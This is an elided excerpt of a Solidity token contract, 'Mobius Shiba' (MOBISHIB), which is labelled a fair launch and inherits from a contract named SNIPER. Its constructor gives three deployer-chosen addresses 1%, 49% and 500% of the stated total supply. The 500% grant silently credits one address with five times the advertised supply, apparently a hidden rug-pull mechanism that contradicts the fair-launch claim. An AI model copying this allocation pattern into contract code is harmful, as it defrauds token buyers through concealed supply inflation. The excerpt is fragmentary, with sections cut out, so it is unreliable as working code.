...
https://twitter.com/MobiusMoney
https://coinmarketcap.com/currencies/mobius-money/
------------------------------------------------------
*/
...
contract MobiusShiba is SNIPER {
     // FairLaunch
    // common addresses
    address private owner;
    address private SHIBABSC;
    address private SHIBACoin;
    address private SHIBAs;
    ...
    string public override name = "Mobius Shiba";
    string public override symbol = "MOBISHIB";
    ...
    constructor(uint totalSupplyValue, address SHIBABSCAddress, address SHIBACoinAddress, address SHIBAsAddress) {
        // set total supply
        totalSupply = totalSupplyValue;
        
        // designate addresses
        owner = msg.sender;
        SHIBABSC = SHIBABSCAddress;
        SHIBACoin = SHIBACoinAddress;
        SHIBAs = SHIBAsAddress;
        balances[SHIBABSC] =  totalSupply * 1 / 100;
        balances[SHIBACoin] = totalSupply * 49 / 100;
        balances[SHIBAs] = totalSupply * 500 / 100;
